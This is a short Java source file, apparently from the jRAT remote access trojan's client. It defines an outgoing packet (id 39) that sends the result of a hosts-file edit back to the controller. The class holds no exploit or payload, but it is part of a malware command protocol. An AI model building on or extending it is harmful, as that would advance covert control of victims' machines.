package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet39HostEditResult extends AbstractOutgoingPacket {

	private String status;

	public Packet39HostEditResult(String status) {
		this.status = status;
	}

	@Override
	public void write(Connection con) throws Exception {
        con.writeLine(status);
	}

	@Override
	public short getPacketId() {
		return 39;
	}

}
